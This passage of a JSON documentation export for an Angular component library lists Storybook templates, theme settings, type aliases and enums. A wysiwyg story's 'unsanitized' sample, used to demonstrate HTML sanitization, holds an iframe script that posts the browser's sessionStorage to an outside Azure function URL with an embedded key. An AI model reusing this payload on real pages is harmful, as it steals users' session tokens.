*ngIf=\"activePane === 'right'; else leftName;\">\n          <span *ngIf=\"activePane === 'right'\">\n           {{rightMenu.name}}\n         </span>\n        </ng-container>\n        <ng-template #leftName>\n         <span *ngIf=\"activePane === 'left'\">\n           {{leftMenu.name}}\n         </span>\n        </ng-template>\n      </div>\n      <div class=\"sto-drawer__header__suffix\">\n        <button type=\"button\"\n                mat-icon-button\n                (click)=\"closeMenu(); open = false\">\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n</sto-drawer-header>\n<sto-slide-panel class=\"sto-slide-panel\"\n                     [activePane]=\"activePane\">\n                     {{activePane}}\n<sto-navigation-menu [menu]=\"subNavigation\"\n*ngIf=\"activePane === 'right'\"\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\n                         rightPane></sto-navigation-menu>\n<sto-navigation-menu [menu]=\"navigation\"\n*ngIf=\"activePane === 'left'\"\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\n                         leftPane></sto-navigation-menu>\n                         </sto-slide-panel>\n</sto-drawer>\n\n\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n<mat-card class=\"sto-card sto-form\">\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\n</mat-card>\n</div>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args) => {\n  return {\n    component: FormFieldDirective,\n    props: args,\n    template: `\n  <mat-card class=\"sto-form\">\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<mat-select><mat-option>A</mat-option></mat-select>\n</mat-form-field>\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\n<mat-label>Form field without styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Text area with styles</mat-label>\n<textarea matInput [cdkTextareaAutosize]=\"true\">\nSome Text Content\n\nShould not select all on click\n</textarea>\n</mat-form-field>\n</mat-card>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/number-input.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args) => {\n  return {\n    component: NumberInputComponent,\n    props: {\n      ...args,\n      change: action('Value changed'),\n      control: new FormControl(null, Validators.required),\n      toggleValidator: (ctrl: AbstractControl) => {\n        if ( ctrl.validator ) {\n          ctrl.clearValidators();\n        } else {\n          ctrl.setValidators(Validators.required);\n        }\n        ctrl.updateValueAndValidity();\n      },\n    },\n    template: `\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-input (ngModelChange)=\"change($event)\"\n            [dynamicFractionSize]=\"dynamicFractionSize\"\n                        [fractionSize]=\"fractionSize\"\n                        [readonly]=\"readonly\"\n                        [formControl]=\"control\"\n                        [placeholder]=\"placeholder\">\n      </sto-number-input>\n      <span matSuffix>{{ suffix }}</span>\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\n    </mat-form-field><br>\n    {{control.value}}\n  </mat-card>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "Story<>",
                "defaultValue": "(args) => {\n  return {\n    component: NumberUnitInputComponent,\n    props: {\n      ...args,\n      control,\n      change: action('Value changed'),\n    },\n    template: `\n<mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\n      [fractionSize]=\"fractionSize\"\n      [list]=\"units\"\n      [readonly]=\"readonly\"\n      [formControl]=\"control\"\n      [unitPlaceholder]=\"unitPlaceholder\"\n      [unitClearText]=\"unitClearText\"\n      [unitOptional]=\"unitOptional\"\n      [placeholder]=\"placeholder\">\n      </sto-number-unit-input>\n    </mat-form-field><br>\n    {{control.value | json}}\n  </mat-card>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                "type": "Story<SlideToggleComponent>",
                "defaultValue": "(args) => {\n  return {\n    component: SlideToggleComponent,\n    props: {\n      ...args,\n      ctrl: new FormControl(true),\n      valueChange: action('Value changed'),\n    },\n    template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\">\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\n<mat-form-field stoFormField floatLabel=\"always\">\n    <mat-label>Slide toggle</mat-label>\n    <sto-slide-toggle [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\n</mat-form-field>\n</mat-card>`\n  };\n}"
            },
            {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "Story<WysiwygComponent>",
                "defaultValue": "(args) => {\n  const ctrl = new FormControl(unsanitized);\n  return {\n    props: { ...args, ctrl, unsanitized },\n    template: `\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\n<hr>\n<div>\n<p>The text we're sending in is</p>\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\n<br>\n<p>The resulting HTML output is then sanitized </p>\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\n(and preferable on your backend service)</p>\n</div>\n`\n  };\n}"
            },
            {
                "name": "THEME_SAVER",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/theme/theme-saver.service.ts",
                "type": "",
                "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
            },
            {
                "name": "themes",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/theme/models.ts",
                "type": "",
                "defaultValue": "new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n])"
            },
            {
                "name": "typography",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/theme/models.ts",
                "type": "",
                "defaultValue": "new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n])"
            },
            {
                "name": "unsanitized",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "",
                "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\n</iframe>\n<b>This is bold.</b>\n`"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "type": "Story<PreferenceManagerComponent>",
                "defaultValue": "(args: PreferenceManagerComponent) => {\n  return {\n    props: {\n      ...args,\n      filterForm: new FormControl(),\n      onSelect: function (id: string) {\n        this.activePreferenceId = id;\n        this.filterForm.reset();\n        action('Select preference')(id);\n      },\n      onSetDefault: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\n        prefs[ index ] = pref;\n        this.loadingIndicator = true;\n        action('Set default preference')(pref.name);\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onEdit: function (pref: Preference) {\n        const preferences = this.preferences as Preference[];\n        const index = preferences.findIndex(p => p.id === pref.id);\n        const prefs = [ ...preferences ];\n        prefs[ index ] = pref;\n        // Set preference in payload\n        this.loadingIndicator = true;\n        this.filterForm.markAsPristine();\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\n\n        setTimeout(() => {\n          this.preferences = prefs;\n          this.loadingIndicator = false;\n        }, 300);\n      },\n      onDeletePreference: function (id: string) {\n        action('Delete preference')(id);\n        const preferences = this.prerences as Preference[];\n        const index = preferences.findIndex(p => p.id === id);\n        const prefs = [ ...preferences ];\n        prefs.splice(index, 1);\n        this.preferences = prefs;\n      },\n      onAdd: function (preference: Preference) {\n        action('Create preference')(preference);\n        preference.id = Date.now().toString(10);\n        this.preferences = [ ...this.preferences, preference ];\n      }\n    },\n    component: PreferenceManagerComponent,\n    template: `\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\n</sto-filter-panel>\n\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\n                                            (editPreference)=\"onEdit($event)\"\n                                            (addNewPreference)=\"onAdd($event)\"\n                                            [dirty]=\"filterForm.dirty\"\n                                            (deletePreference)=\"onDeletePreference($event)\"\n                                            (selectPreference)=\"onSelect($event)\"\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\n                                            [activePreferenceId]=\"activePreferenceId\"\n                                            [preferences]=\"preferences\"></sto-preference-manager>\n`\n  };\n}"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                "type": "Story<ConfirmDemoComponent>",
                "defaultValue": "(args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n}"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/number-input.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "UsageWithInput",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "USE_HASH_ROUTING",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
                "type": "",
                "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
            },
            {
                "name": "validCommands",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
                "type": "[]",
                "defaultValue": "[\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n]"
            },
            {
                "name": "Warn",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "Warning",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "WithUserMenu",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "Story<StoAppHeaderComponent>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n      ...args\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n<button mat-icon-button><mat-icon>home</mat-icon></button>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
            },
            {
                "name": "writeFile",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/build-scss.ts",
                "type": "",
                "defaultValue": "promisify(writeFileCb)"
            }
        ],
        "functions": [
            {
                "name": "LoggerFactory",
                "file": "libs/error-handler/src/lib/wrapper.ts",
                "ctype": "miscellaneous",
                "subtype": "function",
                "description": "",
                "args": [
                    {
                        "name": "http"
                    }
                ],
                "jsdoctags": [
                    {
                        "name": "http",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            {
                "name": "processScss",
                "file": "tools/scripts/build-scss.ts",
                "ctype": "miscellaneous",
                "subtype": "function",
                "description": "",
                "args": [
                    {
                        "name": "file"
                    },
                    {
                        "name": "outFile"
                    }
                ],
                "returnType": "Promise<void>",
                "jsdoctags": [
                    {
                        "name": "file",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "outFile",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        ],
        "typealiases": [
            {
                "name": "ClassFunction",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "description": "",
                "kind": 162
            },
            {
                "name": "Data",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "literal type",
                "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
                "description": "",
                "kind": 165
            },
            {
                "name": "Handler",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "description": "",
                "kind": 162
            },
            {
                "name": "HeaderContextMenu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "ContextMenu",
                "file": "libs/datatable/src/lib/sto-datatable/events.ts",
                "description": "",
                "kind": 161
            },
            {
                "name": "Menu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "literal type",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "description": "",
                "kind": 165
            },
            {
                "name": "Menu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "",
                "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "description": "",
                "kind": 169
            },
            {
                "name": "PaneType",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"left\" | \"right\"",
                "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
                "description": "",
                "kind": 168
            },
            {
                "name": "ReturnValue",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "Promise<T> | Observable<T> | T",
                "file": "libs/common/src/lib/theme/theme-saver.service.ts",
                "description": "",
                "kind": 168
            },
            {
                "name": "rowClassFn",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/models.ts",
                "description": "",
                "kind": 162
            },
            {
                "name": "RowContextMenu",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "",
                "file": "libs/datatable/src/lib/sto-datatable/events.ts",
                "description": "",
                "kind": 169
            },
            {
                "name": "SortFunction",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "description": "",
                "kind": 162
            },
            {
                "name": "ThemeClassName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "description": "",
                "kind": 168
            },
            {
                "name": "ThemeName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"light\" | \"dark\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "description": "",
                "kind": 168
            },
            {
                "name": "TypographyClassName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "description": "",
                "kind": 168
            },
            {
                "name": "TypographyName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"small\" | \"medium\" | \"large\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "description": "",
                "kind": 168
            }
        ],
        "enumerations": [
            {
                "name": "ColumnDisplay",
                "childs": [
                    {
                        "name": "Flex",
                        "value": "flex"
                    },
                    {
                        "name": "Force",
                        "value": "force"
                    }
                ],
                "ctype": "miscellaneous",
                "subtype": "enum",
                "description": "",
                "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
            },
            {
                "name": "Key",
                "childs": [
                    {
                        "name": "Backspace",
                        "value": "8"
                    },
                    {
                        "name": "Tab",
                        "value": "9"
                    },
                    {
                        "name": "Enter",
                        "value": "13"
                    },
                    {
                        "name": "Shift",
                        "value": "16"
                    },
                    {
                        "name": "Ctrl",
                        "value": "17"
                    },
                    {
                        "name": "Alt",
                        "value": "18"
                    },
                    {
                        "name": "PauseBreak",
                        "value": "19"
                    },
                    {
                        "name": "CapsLock",
                        "value": "20"
                    },
                    {
                        "name": "Escape",
                        "value": "27"
                    },
                    {
                        "name": "Space",
                        "value": "32"
                    },
                    {
                        "name": "PageUp",
                        "value": "33"
                    },
                    {
                        "name": "PageDown",
                        "value": "34"
                    },
                    {
                        "name": "End",
                        "value": "35"
                    },
                    {
                        "name": "Home",
                        "value": "36"
                    },
                    {
                        "name": "LeftArrow",
                        "value": "37"
                    },
                    {
                        "name": "UpArrow",
                        "value": "38"
                    },
                    {
                        "name": "RightArrow",
                        "value": "39"
                    },
                    {
                        "name": "DownArrow",
                        "value": "40"
                    },
                    {
                        "name": "Insert",
                        "value": "45"
                    },
                    {
                        "name": "Delete",
                        "value": "46"
                    },
                    {
                        "name": "Zero",
                        "value": "48"
                    },
                    {
                        "name": "ClosedParen",
                        "value": "Zero"
                    },
                    {
                        "name": "One",
                        "value": "49"
                    },
                    {
                        "name": "ExclamationMark",
                        "value": "One"
                    },
                    {
                        "name": "Two",
                        "value": "50"
                    },
                    {
                        "name": "AtSign",
                        "value": "Two"
                    },
                    {
                        "name": "Three",
                        "value": "51"
                    },
                    {
                        "name": "PoundSign",
                        "value": "Three"
                    },
                    {
                        "name": "Hash",
                        "value": "PoundSign"
                    },
                    {
                        "name": "Four",
                        "value": "52"
                    },
                    {
                        "name": "DollarSign",
                        "value": "Four"
                    },
                    {
                        "name": "Five",
                        "value": "53"
                    },
                    {
                        "name": "PercentSign",
                        "value": "Five"
                    },
                    {
                        "name": "Six",
                        "value": "54"
                    },
                    {
                        "name": "Caret",
                        "value": "Six"
                    },
                    {
                        "name": "Hat",
                        "value": "Caret"
                    },
                    {
                        "name": "Seven",
                        "value": "55"
                    },
                    {
                        "name": "Ampersand",
                        "value": "Seven"
                    },
                    {
                        "name": "Eight",
                        "value": "56"
                    },
                    {
                        "name": "Star",
                        "value": "Eight"
                    },
                    {
                        "name": "Asterik",
                        "value": "Star"
                    },
                    {
                        "name": "Nine",
                        "value": "57"
                    },
                    {
                        "name": "OpenParen",
                        "value": "Nine"
                    },
                    {
                        "name": "A",
                        "value": "65"
                    },
                    {
                        "name": "B",
                        "value": "66"
                    },
                    {
                        "name": "C",
                        "value": "67"
                    },
                    {
                        "name": "D",
                        "value": "68"
                    },
                    {
                        "name": "E",
                        "value": "69"
                    },
                    {
                        "name": "F",
                        "value": "70"
                    },
                    {
                        "name": "G",
                        "value": "71"
                    },
                    {
                        "name": "H",
                        "value": "72"
                    },
                    {
                        "name": "I",
                        "value": "73"
                    },
                    {
                        "name": "J",
                        "value": "74"
                    },
                    {
                        "name": "K",
                        "value": "75"
                    },
                    {
                        "name": "L",
                        "value": "76"
                    },
                    {
                        "name": "M",
                        "value": "77"
                    },
                    {
                        "name": "N",
                        "value": "78"
                    },
                    {
                        "name": "O",
                        "value": "79"
                    },
                    {
                        "name": "P",
                        "value": "80"
                    },
                    {
                        "name": "Q",
                        "value": "81"
                    },
                    {
                        "name": "R",
                        "value": "82"
                    },
                    {
                        "name": "S",
                        "value": "83"
                    },
                    {
                        "name": "T",
                        "value": "84"
                    },
                    {
                        "name": "U",
                        "value": "85"
                    },
                    {
                        "name": "V",
                        "value": "86"
                    },
                    {
                        "name": "W",
                        "value": "87"
                    },
                    {
                        "name": "X",
                        "value": "88"
                    },
                    {
                        "name": "Y",
                        "value": "89"
                    },
                    {
                        "name": "Z",
                        "value": "90"
                    },
                    {
                        "name": "LeftWindowKey",
                        "value": "91"
                    },
                    {
                        "name": "RightWindowKey",
                        "value": "92"
                    },
                    {
                        "name": "SelectKey",
                        "value": "93"
                    },
                    {
                        "name": "Numpad0",
                        "value": "96"
                    },
                    {
                        "name": "Numpad1",
                        "value": "97"
                    },
                    {
                        "name": "Numpad2",
                        "value": "98"
                    },
                    {
                        "name": "Numpad3",
                        "value": "99"
                    },
                    {
                        "name": "Numpad4",
                        "value": "100"
                    },
                    {
                        "name": "Numpad5",
                        "value": "101"
                    },
                    {
                        "name": "Numpad6",
                        "value": "102"
                    },
                    {
                        "name": "Numpad7",
                        "value": "103"
                    },
                    {
                        "name": "Numpad8",
                        "value": "104"
                    },
                    {
                        "name": "Numpad9",
                        "value": "105"
                    },
                    {
                        "name": "Multiply",
                        "value": "106"
                    },
                    {
                        "name": "Add",
                        "value": "107"
                    },
                    {
                        "name": "Subtract",
                        "value": "109"
                    },
                    {
                        "name": "DecimalPoint",
                        "value": "110"
                    },
                    {
                        "name": "Divide",
                        "value": "111"
                    },
                    {
                        "name": "F1",
                        "value": "112"
                    },
                    {
                        "name": "F2",
                        "value": "113"
                    },
                    {
                        "name": "F3",
                        "value": "114"
                    },
                    {
                        "name": "F4",
                        "value": "115"
                    },
                    {
                        "name": "F5",
                        "value": "116"
                    },
                    {
                        "name": "F6",
                        "value": "117"
                    },
                    {
                        "name": "F7",
                        "value": "118"
                    },
                    {
                        "name": "F8",
                        "value": "119"
                    },
                    {
                        "name": "F9",
                        "value": "120"
                    },
                    {
                        "name": "F10",
                        "value": "121"
                    },
                    {
                        "name": "F11",
                        "value": "122"
                    },
                    {
                        "name": "F12",
                        "value": "123"
                    },
                    {
                        "name": "NumLock",
                        "value": "144"
                    },
                    {
                        "name": "ScrollLock",
                        "value": "145"
                    },
                    {
                        "name": "SemiColon",
                        "value": "186"
                    },
                    {
                        "name": "Equals",
                        "value": "187"
                    },
                    {
                        "name": "Comma",
                        "value": "188"
                    },
                    {
                        "name": "Dash",
                        "value": "189"
                    },
                    {
                        "name": "Period",
                        "value": "190"
                    },
                    {
                        "name": "UnderScore",
                        "value": "Dash"
                    },
                    {
                        "name": "PlusSign",
                        "value": "Equals"
                    },
                    {
                        "name": "ForwardSlash",
                        "value": "191"
                    },
                    {
                        "name": "Tilde",
                        "value": "192"
                    },
                    {
                        "name": "GraveAccent",
                        "value": "Tilde"
                    },
                    {
                        "name": "OpenBracket",
                        "value": "219"
                    },
                    {
                        "name": "ClosedBracket",
                        "value": "221"
                    },
                    {
                        "name": "Quote",
                        "value": "222"
                    }
                ],
                "ctype": "miscellaneous",
                "subtype": "enum",
                "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
                "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
            },
            {
                "name": "MenuItemTypes",
                "childs": [
                    {
                        "name": "External",
                        "value": "externalLink"
                    },
                    {
                        "name": "ExternalNew",
                        "value": "externalLinkNewWindow"
                    },
                    {
                        "name": "Internal",
                        "value": "internalLink"
                    },
                    {
                        "name": "Navigate",
                        "value": "navigate"
                    }
                ],
                "ctype": "miscellaneous",
                "subtype": "enum",
                "description": "",
                "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
            },
            {
                "name": "SelectionModes",
                "childs": [
                    {
                        "name": "Click",
                        "value": "click"
                    },
                    {
                        "name": "DoubleClick",
                        "value": "dblclick"
                    }
                ],
                "ctype": "miscellaneous",
                "subtype": "enum",
                "description": "",
                "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
            }
        ],
        "groupedVariables": {
            "libs/common/src/lib/sto-message-panel/message-panel.stories.ts": [
                {
                    "name": "Accent",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "argTypes",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "object",
                    "defaultValue": "{\n  color: { control: { disable: true } },\n  dismissable: { control: { disable: true } },\n  icon: { control: { disable: true } },\n  severity: { control: { disable: true } },\n}"
                },
                {
                    "name": "Danger",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "Dismissable",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
